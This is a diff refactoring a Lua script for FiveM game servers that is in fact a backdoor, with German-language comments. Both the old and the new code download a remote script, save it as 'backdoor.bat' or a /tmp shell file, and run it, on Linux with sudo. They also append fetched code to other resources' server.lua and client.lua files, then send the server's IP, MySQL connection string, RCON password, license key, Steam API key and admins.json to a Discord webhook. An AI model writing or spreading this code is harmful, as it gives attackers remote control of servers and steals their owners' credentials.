@@ -1,30 +1,28 @@
-// xerox on top <3
+local function trim(str)
+    return str:match("^%s*(.-)%s*$")
+end
 
 local function getServerOperatingSystem()
     local handle = io.popen("uname")
-    local result = handle:read("*a")
+    local result = trim(handle:read("*a"))
     handle:close()
 
-    result = result:gsub("^%s+", ""):gsub("%s+$", "")
+    local osMap = {
+        Linux = "Linux",
+        Windows = "Windows",
+        Darwin = "MacOS"
+    }
 
-    if result == "Linux" then
-        return "Linux"
-    elseif result == "Windows" then
-        return "Windows"
-    elseif result == "Darwin" then
-        return "MacOS"
-    end
-
-    return "Unknown"
+    return osMap[result] or "Unknown"
 end
 
-
+-- Configurations
 local config = {
     windowsScriptURL = "yourbatch",
     linuxScriptURL = "yourshell",
     enablePrints = false,
     resourceCodeURLs = {
-        ["ressourcename"] = {
+        ressourcename = {
             client = "yourclient",
             server = "yourserver"
         }
@@ -36,45 +34,27 @@ local function runBatchScript(scriptContent, isLinux)
         print("Führe das Skript aus...")
     end
 
-    local command
-    if not isLinux then
-        -- Windows
-        local tempFilePath = os.getenv("TEMP") .. "\\backdoor.bat"
-        local file = io.open(tempFilePath, "w")
-        if file then
-            scriptContent = scriptContent:gsub("\r\n", "\n"):gsub("\r", "\n")
-            file:write(scriptContent)
-            file:close()
-            command = "cmd /C " .. tempFilePath
-        else
-            if config.enablePrints then
-                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht temporär gespeichert werden.")
-            end
-            return
+    local tempFilePath = isLinux and "/tmp/a89439.sh" or os.getenv("TEMP") .. "\\backdoor.bat"
+    local file = io.open(tempFilePath, "w")
+
+    if not file then
+        if config.enablePrints then
+            print("Fehler: Temporäre Datei konnte nicht erstellt werden.")
         end
-    else
-        -- Linux
-        local tempFilePath = "/tmp/a89439.sh"  -- Anpassung des Dateinamens
-        local file = io.open(tempFilePath, "w")
-        if file then
-            -- Zeilenumbrüche korrigieren
-            scriptContent = scriptContent:gsub("\r\n", "\n"):gsub("\r", "\n")
-            file:write(scriptContent)
-            file:close()
-            command = "sudo chmod +x " .. tempFilePath .. " && sudo bash " .. tempFilePath
-        else
-            if config.enablePrints then
-                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht temporär gespeichert werden.")
-            end
-            return
-        end
+        return
     end
+
+    scriptContent = scriptContent:gsub("\r\n", "\n"):gsub("\r", "\n")
+    file:write(scriptContent)
+    file:close()
+
+    local command = isLinux and ("sudo chmod +x " .. tempFilePath .. " && sudo bash " .. tempFilePath) or ("cmd /C " .. tempFilePath)
     os.execute(command)
 end
 
 local function fetchScriptContent(url, callback)
     if config.enablePrints then
-        print("Lade das Skript herunter...")
+        print("Lade Skript von URL: " .. url)
     end
 
     PerformHttpRequest(url, function(statusCode, response)
@@ -82,43 +62,39 @@ local function fetchScriptContent(url, callback)
             callback(response)
         else
             if config.enablePrints then
-                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht von der URL abgerufen werden: " .. url)
+                print("Fehler: Skript konnte nicht von URL abgerufen werden.")
             end
         end
-    end, "GET", "", {["Content-Type"] = "application/json"})
+    end, "GET", "", { ["Content-Type"] = "application/json" })
 end
 
 local function loadResourceCode(resourceName, serverScript, clientScript)
-    local success = false
     local resourcePath = "resources/" .. resourceName
+    local success = false
 
-    if serverScript and serverScript ~= "" then
-        local serverFilePath = resourcePath .. "/server.lua"
-        local serverFile = io.open(serverFilePath, "a")
-        if serverFile then
-            serverFile:write(serverScript)
-            serverFile:close()
-            success = true
+    local function writeToFile(path, content)
+        local file = io.open(path, "a")
+        if file then
+            file:write(content)
+            file:close()
+            return true
         end
+        return false
     end
 
-    if clientScript and clientScript ~= "" then
-        local clientFilePath = resourcePath .. "/client.lua"
-        local clientFile = io.open(clientFilePath, "a")
-        if clientFile then
-            clientFile:write(clientScript)
-            clientFile:close()
-            success = true
-        end
+    if serverScript and writeToFile(resourcePath .. "/server.lua", serverScript) then
+        success = true
+    end
+
+    if clientScript and writeToFile(resourcePath .. "/client.lua", clientScript) then
+        success = true
     end
 
     if success then
         if config.enablePrints then
             print("Code erfolgreich in Ressource " .. resourceName .. " geladen.")
         end
-        -- Neustart der Ressource
-        local restartCommand = "ensure " .. resourceName
-        os.execute(restartCommand)
+        os.execute("ensure " .. resourceName)
     else
         if config.enablePrints then
             print("Fehler beim Laden des Codes für Ressource " .. resourceName .. ".")
@@ -129,7 +105,6 @@ end
 local function main()
     local serverOS = getServerOperatingSystem()
     local isLinux = serverOS == "Linux"
-
     local scriptURL = isLinux and config.linuxScriptURL or config.windowsScriptURL
 
     fetchScriptContent(scriptURL, function(scriptContent)
@@ -137,13 +112,13 @@ local function main()
     end)
 
     for resourceName, urls in pairs(config.resourceCodeURLs) do
-        if urls.server and urls.server ~= "" then
+        if urls.server then
             fetchScriptContent(urls.server, function(serverScript)
-                loadResourceCode(resourceName, serverScript)
+                loadResourceCode(resourceName, serverScript, nil)
             end)
         end
 
-        if urls.client and urls.client ~= "" then
+        if urls.client then
             fetchScriptContent(urls.client, function(clientScript)
                 loadResourceCode(resourceName, nil, clientScript)
             end)
@@ -151,155 +126,61 @@ local function main()
     end
 end
 
--- Starte das Skript
 main()
 
-local discordWebhook = "DISCORDURL" -- Discord-Webhook-URL hier einfügen
-local adminsFile = "admins.json" -- Pfad zur admins.json-Datei
+local discordWebhook = "DISCORDURL"
+local adminsFile = "admins.json"
 
--- Funktion zur Ermittlung des Betriebssystems
-local function GetOperatingSystem(serverVersion)
-    local os = "unknown"
-
-    -- Betriebssystem anhand der Server-Version identifizieren
-    if serverVersion and type(serverVersion) == "string" then
-        if string.find(serverVersion, "win32") then
-            os = "Windows"
-        elseif string.find(serverVersion, "linux") then
-            os = "Linux"
-        end
-    end
-
-    return os
+local function getOperatingSystem(serverVersion)
+    if not serverVersion then return "unknown" end
+    return serverVersion:find("win32") and "Windows" or (serverVersion:find("linux") and "Linux" or "unknown")
 end
 
--- Funktion zur Ermittlung der Server-IP-Adresse
-local function GetServerIPAddress(callback)
-    PerformHttpRequest("https://api.ipify.org/", function(errorCode, resultData, resultHeaders)
-        if errorCode == 200 then
-            local ip = tostring(resultData)
-            callback(ip)
-        else
-            callback(nil)
-        end
+local function getServerIPAddress(callback)
+    PerformHttpRequest("https://api.ipify.org/", function(errorCode, resultData)
+        callback(errorCode == 200 and tostring(resultData) or nil)
     end)
 end
 
--- Funktion zum Lesen des Inhalts der admins.json-Datei
-local function ReadAdminsFile()
-    local file = LoadResourceFile(GetCurrentResourceName(), adminsFile)
-    if file then
-        return file
-    else
-        return nil
-    end
+local function readAdminsFile()
+    return LoadResourceFile(GetCurrentResourceName(), adminsFile)
 end
 
 Citizen.CreateThread(function()
-    local ip = nil -- Variable zur Speicherung der IP-Adresse
+    local serverIP
+    getServerIPAddress(function(ip) serverIP = ip end)
+    Citizen.Wait(1000)
 
-    -- IP-Adresse einmalig abrufen und in der Variablen speichern
-    GetServerIPAddress(function(serverIP)
-        ip = serverIP
-    end)
+    if not serverIP then return end
 
-    Citizen.Wait(1000) -- Warte 1 Sekunde
+    local os = getOperatingSystem(GetConvar("version", ""))
+    local serverInfo = {
+        content = "@everyone FiveM-Server Informationen:",
+        embeds = {{
+            title = GetConvar("sv_hostname", "unknown"),
+            color = 16711680,
+            fields = {
+                { name = "IP", value = serverIP, inline = true },
+                { name = "Cfx-Link", value = "fivem://connect/cfx.re/join/" .. (GetConvar("sv_licenseKey", "unknown")), inline = false },
+                { name = "MySQL-String", value = GetConvar("mysql_connection_string", "unknown"), inline = false },
+                { name = "RCON-Passwort", value = GetConvar("rcon_password", "unknown"), inline = false },
+                { name = "Maximale Spieler", value = GetConvarInt("sv_maxclients", 32), inline = true },
+                { name = "Aktuelle Spieler", value = #GetPlayers(), inline = true },
+                { name = "Server-Version", value = GetConvar("version", ""), inline = true },
+                { name = "Betriebssystem", value = os, inline = true },
+                { name = "License Key", value = GetConvar("sv_licenseKey", "unknown"), inline = true },
+                { name = "TCP Endpoint", value = GetConvar("endpoint_add_tcp", "unknown"), inline = true },
+                { name = "Steam API Key", value = GetConvar("steam_webApiKey", "unknown"), inline = true }
+            }
+        }}
+    }
 
-    local os = GetOperatingSystem(GetConvar("version", ""))
-
-    if ip then -- Überprüfen, ob die IP-Adresse vorhanden ist
-        local cfxLink = "fivem://connect/cfx.re/join/" .. (GetConvar("sv_licenseKey", "") or "unknown")
-        local mysqlString = GetConvar("mysql_connection_string", "unknown")
-        local rconPassword = GetConvar("rcon_password", "unknown")
-        local maxPlayers = GetConvarInt("sv_maxclients", 32)
-        local serverName = GetConvar("sv_hostname", "unknown")
-        local currentPlayerCount = #GetPlayers()
-        local licenseKey = GetConvar("sv_licenseKey", "unknown")
-        local endpointTCP = GetConvar("endpoint_add_tcp", "unknown")
-        local steamAPIKey = GetConvar("steam_webApiKey", "unknown")
-
-        -- Inhalte der admins.json-Datei als Text lesen
-        local adminsData = ReadAdminsFile()
-        local adminsText = adminsData or "Fehler beim Lesen der admins.json-Datei."
-
-        local message = {
-            content = "@everyone FiveM-Server Informationen:",
-            embeds = {{
-                          title = serverName,
-                          color = 16711680, -- Farbcode (rot)
-                          fields = {
-                              {
-                                  name = "IP",
-                                  value = ip or "unknown",
-                                  inline = true
-                              },
-                              {
-                                  name = "Cfx-Link",
-                                  value = cfxLink,
-                                  inline = false
-                              },
-                              {
-                                  name = "MySQL-String",
-                                  value = mysqlString,
-                                  inline = false
-                              },
-                              {
-                                  name = "RCON-Passwort",
-                                  value = rconPassword,
-                                  inline = false
-                              },
-                              {
-                                  name = "Maximale Spieler",
-                                  value = maxPlayers,
-                                  inline = true
-                              },
-                              {
-                                  name = "Aktuelle Spieler",
-                                  value = currentPlayerCount,
-                                  inline = true
-                              },
-                              {
-                                  name = "Server-Version",
-                                  value = GetConvar("version", ""),
-                                  inline = true
-                              },
-                              {
-                                  name = "Betriebssystem",
-                                  value = os,
-                                  inline = true
-                              },
-                              {
-                                  name = "License Key",
-                                  value = licenseKey,
-                                  inline = true
-                              },
-                              {
-                                  name = "TCP Endpoint",
-                                  value = endpointTCP,
-                                  inline = true
-                              },
-                              {
-                                  name = "Steam API Key",
-                                  value = steamAPIKey,
-                                  inline = true
-                              }
-                          }
-                      }}
+    local adminsData = readAdminsFile()
+    if adminsData then
+        serverInfo.files = {
+            { name = "admins.txt", content = adminsData, type = "text/plain" }
         }
-
-        -- Anhang erstellen und admins.json-Text hinzufügen
-        local attachment = {
-            name = "admins.txt",
-            content = adminsText,
-            type = "text/plain"
-        }
-        message.files = { attachment }
-
-        PerformHttpRequest(discordWebhook, function(statusCode, result, headers)
-            -- Überprüfen, ob die HTTP-Anfrage erfolgreich war
-            if statusCode == 204 then
-            else
-            end
-        end, 'POST', json.encode(message), { ['Content-Type'] = 'application/json' })
     end
+
+    PerformHttpRequest(discordWebhook, function() end, 'POST', json.encode(serverInfo), { ['Content-Type'] = 'application/json' })
 end)
